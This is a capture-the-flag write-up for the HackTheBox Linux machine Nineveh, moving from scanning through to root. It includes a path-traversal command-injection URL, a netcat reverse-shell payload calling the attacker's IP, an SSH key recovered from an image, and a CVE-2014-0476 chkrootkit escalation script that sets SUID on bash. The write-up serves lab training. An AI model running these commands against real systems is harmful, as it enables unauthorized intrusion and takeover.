# HackTheBox - Nineveh Writeup

<p align="center">
  <img src="https://img.shields.io/badge/HackTheBox-Nineveh-green?style=for-the-badge">
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge">
  <img src="https://img.shields.io/badge/Difficulty-Medium-red?style=for-the-badge">
</p>

<p align="center">
  <b>Enumeration → Web Exploitation → SSH Access → Privilege Escalation → Root</b>
</p>

---

## Machine Information

| Attribute        | Details         |
| ---------------- | --------------- |
| Platform         | HackTheBox      |
| Machine          | Nineveh         |
| Operating System | Linux           |
| Difficulty       | Medium          |
| Target IP        | `10.129.76.198` |

---

# Table of Contents

* [Reconnaissance](#reconnaissance)
* [Service Enumeration](#service-enumeration)
* [Web Enumeration](#web-enumeration)
* [Credential Discovery](#credential-discovery)
* [Initial Access](#initial-access)
* [Shell Stabilization](#shell-stabilization)
* [SSH Access](#ssh-access)
* [User Flag](#user-flag)
* [Privilege Escalation](#privilege-escalation)
* [Root Access](#root-access)
* [Attack Path Summary](#attack-path-summary)
* [Key Takeaways](#key-takeaways)

---

# Reconnaissance

We begin by identifying open ports on the target.

```bash
nmap -p- --min-rate 1000 -T4 10.129.76.198
```

### Scan Results

```text
Nmap scan report for 10.129.76.198
Host is up, received echo-reply ttl 63 (0.38s latency).

Not shown: 998 filtered tcp ports (no-response)

PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```

Only two TCP ports are exposed:

* HTTP
* HTTPS

While continuing enumeration, an all-port scan can remain running in the background.

---

# Service Enumeration

Next, we perform service and version detection.

```bash
nmap -sC -sV -p 80,443 10.129.76.198
```

### Results

```text
PORT    STATE SERVICE  VERSION

80/tcp  open  http
Apache httpd 2.4.18 (Ubuntu)

443/tcp open  ssl/http
Apache httpd 2.4.18 (Ubuntu)
```

The SSL certificate provides an interesting hostname.

```text
Common Name: nineveh.htb
```

We add the hostname to our `/etc/hosts` file.

```bash
sudo nano /etc/hosts
```

Add:

```text
10.129.76.198 nineveh.htb
```

---

# Web Enumeration

The target exposes both HTTP and HTTPS services.

We begin exploring the available web applications using Burp Suite and directory enumeration.

## HTTPS Enumeration

Directory fuzzing reveals an interesting directory.

```text
/db
```

Visiting the directory reveals:

```text
phpLiteAdmin v1.9
```

This provides a password authentication page.

Another interesting directory discovered during enumeration is:

```text
/secure_notes
```

The `/secure_notes` page contains an image.

At first glance, the image does not appear particularly interesting. However, downloading the file and inspecting its contents reveals sensitive information.

```bash
strings nineveh.png
```

Interestingly, the output reveals SSH private key material.

This becomes an important credential source later in the attack.

---

# Credential Discovery

Two authentication mechanisms are discovered during enumeration.

## Department Login

The HTTP service exposes another application under:

```text
/department
```

Inspecting the source code reveals an interesting developer comment.

```html
<!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->
```

This confirms the existence of an administrative account.

A login password is eventually discovered for the department application:

```text
Username: admin
Password: 1q2w3e4r5t
```

---

## phpLiteAdmin Authentication

The HTTPS service exposes phpLiteAdmin.

The discovered version is:

```text
phpLiteAdmin v1.9
```

After authentication testing, valid credentials are discovered:

```text
Username: admin
Password: password123
```

Successful authentication provides access to the phpLiteAdmin interface.

---

# Vulnerability Research

The identified phpLiteAdmin version is vulnerable to code execution techniques.

Relevant research can be found through public exploit references for:

```text
phpLiteAdmin 1.9
```

The vulnerable functionality allows an attacker to manipulate database files in a way that can lead to PHP code execution.

After creating the malicious database content, it can be accessed through the web application.

The application also contains a vulnerable parameter in the department functionality.

A path traversal style payload can be used to reach files outside the intended directory.

Example:

```text
http://nineveh.htb/department/manage.php?notes=/opt/files/ninevehNotes/../../../../../var/tmp/test&cmd=id
```

This confirms command execution.

---

# Initial Access

Once command execution is confirmed, a reverse shell can be triggered.

A listener is started locally.

```bash
nc -lvnp 4444
```

A command is then executed through the vulnerable endpoint.

```text
http://nineveh.htb/department/manage.php?notes=/opt/files/ninevehNotes/../../../../../var/tmp/test&cmd=busybox%20nc%2010.10.16.104%204444%20-e%20/bin/bash
```

The listener receives a connection.

```text
connect to [10.10.16.104] from [10.129.76.198]
```

Checking the current identity:

```bash
id
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Initial access has been obtained as:

```text
www-data
```

---

# Shell Stabilization

The initial shell is unstable, so we upgrade it to a proper TTY.

First, check for Python.

```bash
which python3
```

Output:

```text
/usr/bin/python3
```

Spawn a proper shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background the shell:

```text
CTRL + Z
```

Configure the terminal locally.

```bash
stty raw -echo
fg
```

Then configure the remote shell.

```bash
export TERM=xterm-256color
```

The shell is now significantly more stable.

---

# Internal Enumeration

We inspect listening services from inside the machine.

```bash
ss -tunlp
```

Output shows:

```text
tcp LISTEN 0 128 *:22
```

SSH is running internally.

Although SSH may not be directly accessible in the expected way externally, we already discovered SSH private key material hidden inside the image from the `/secure_notes` directory.

The extracted private key can be saved locally.

```bash
chmod 600 id_rsa
```

We can then attempt SSH authentication.

```bash
ssh amrois@127.0.0.1 -i id_rsa
```

Successful authentication provides access as:

```text
amrois
```

---

# User Flag

After obtaining SSH access, we inspect the user's home directory.

```bash
ls
```

Output:

```text
user.txt
```

The user flag can now be accessed.

```bash
cat user.txt
```

User access has been successfully obtained.

---

# Port Knocking

During enumeration, an interesting configuration file is discovered.

```bash
cat /etc/knockd.conf
```

Output:

```text
[options]
logfile = /var/log/knockd.log
interface = ens160

[openSSH]
sequence = 571, 290, 911
seq_timeout = 5
start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
tcpflags = syn

[closeSSH]
sequence = 911,290,571
seq_timeout = 5
start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
tcpflags = syn
```

The machine uses **port knocking** to control SSH access.

The required sequence to open SSH access is:

```text
571 → 290 → 911
```

This provides another potential path for interacting with the SSH service.

---

# Privilege Escalation

With access as `amrois`, we begin local privilege escalation enumeration.

A useful tool for monitoring processes is:

```text
pspy64
```

Running process monitoring reveals that `chkrootkit` is periodically executed as root.

```text
UID=0 PID=26178 | /bin/sh /usr/bin/chkrootkit
```

This is particularly interesting because older versions of `chkrootkit` contain known privilege escalation vulnerabilities.

---

## chkrootkit Vulnerability

The installed environment is vulnerable to the following issue:

```text
chkrootkit 0.49
CVE-2014-0476
```

The vulnerability involves the execution of a file named:

```text
/tmp/update
```

with elevated privileges under certain conditions.

This means an attacker can potentially place a malicious script at that location and wait for the vulnerable root process to execute it.

---

# Exploitation

A malicious `/tmp/update` file is created.

```bash
echo '#!/bin/sh' > /tmp/update
echo 'chmod +s /bin/bash' >> /tmp/update
```

Make it executable.

```bash
chmod 777 /tmp/update
```

Verify the contents.

```bash
cat /tmp/update
```

Output:

```bash
#!/bin/sh
chmod +s /bin/bash
```

The file permissions are configured to allow execution.

```bash
ls -lah /tmp/update
```

Once the vulnerable `chkrootkit` process executes the malicious script, `/bin/bash` receives the SUID permission.

We can then execute:

```bash
/bin/bash -p
```

---

# Root Access

Checking the current identity:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root)
```

We have successfully escalated privileges to root.

The root flag can now be accessed.

```bash
cat /root/root.txt
```

---

# Attack Path Summary

```text
┌─────────────────────┐
│      Nmap Scan      │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ HTTP + HTTPS Found  │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ Web Enumeration    │
│ /db + /department  │
│ /secure_notes      │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ Credentials Found   │
│ Hidden SSH Key      │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ Web Exploitation    │
│ Command Execution   │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ www-data Access     │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ SSH as amrois       │
│ Using Private Key   │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ Process Monitoring  │
│ Root chkrootkit Job │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ CVE-2014-0476       │
│ /tmp/update Abuse   │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│       ROOT          │
└─────────────────────┘
```

---

# Key Takeaways

* Always enumerate both HTTP and HTTPS services independently.
* SSL certificates can reveal valuable hostnames and infrastructure information.
* Hidden directories may expose sensitive applications and credentials.
* Images should not be ignored during enumeration; metadata and embedded content can contain valuable information.
* Developer comments can reveal usernames, technologies, and attack paths.
* Old application versions should always be researched for known vulnerabilities.
* Initial web access should be followed by thorough internal enumeration.
* SSH keys discovered during web enumeration can provide alternative access paths.
* Port knocking configurations may explain seemingly inaccessible services.
* Process monitoring tools such as `pspy` are extremely useful during privilege escalation.
* Scheduled root processes should always be investigated.
* World-writable locations such as `/tmp` can become critical when vulnerable privileged processes execute predictable files.

---

# Tools Used

```text
Nmap
Burp Suite
Hydra
Netcat
Python
SSH
pspy
Linux Enumeration
Public Exploit Research
```

---

# Final Notes

Nineveh is an excellent HackTheBox machine for practicing the complete penetration testing methodology.

The machine demonstrates how multiple weaknesses can be chained together:

```text
Web Enumeration
      ↓
Credential Discovery
      ↓
Hidden SSH Key
      ↓
Web Command Execution
      ↓
Internal Enumeration
      ↓
SSH Access
      ↓
Process Monitoring
      ↓
chkrootkit Privilege Escalation
      ↓
ROOT
```

The most important lesson from this machine is that successful penetration testing is rarely about discovering a single critical vulnerability.

Instead, it is often about carefully enumerating every exposed component and chaining multiple weaknesses together until a complete compromise becomes possible.

---

<p align="center">
  <b>Hack The Box - Nineveh</b><br>
  Linux | Medium | Web Exploitation | Credential Discovery | SSH | Privilege Escalation
</p>
